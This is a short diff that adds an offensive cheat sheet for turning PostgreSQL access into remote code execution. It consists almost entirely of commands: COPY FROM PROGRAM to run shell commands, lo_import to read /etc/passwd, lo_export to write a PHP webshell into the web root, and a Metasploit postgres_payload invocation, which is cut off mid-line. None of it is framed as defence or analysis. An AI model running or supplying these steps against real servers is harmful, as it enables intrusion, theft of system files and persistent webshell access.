@@ -1,0 +1,14 @@
+PostgreSQL → RCE
+bashpsql -h target -U postgres
+
+-- COPY TO PROGRAM (9.3+)
+postgres=# CREATE TABLE cmd_exec(cmd_output text);
+postgres=# COPY cmd_exec FROM PROGRAM 'id';
+postgres=# SELECT * FROM cmd_exec;
+
+-- Write webshell via large objects
+postgres=# SELECT lo_import('/etc/passwd');
+postgres=# SELECT lo_export(OID, '/var/www/html/shell.php');
+
+-- Metasploit
+msfconsole -q -x "use exploit/linux/postgres/postgres_payload; set RHOSTS target; 
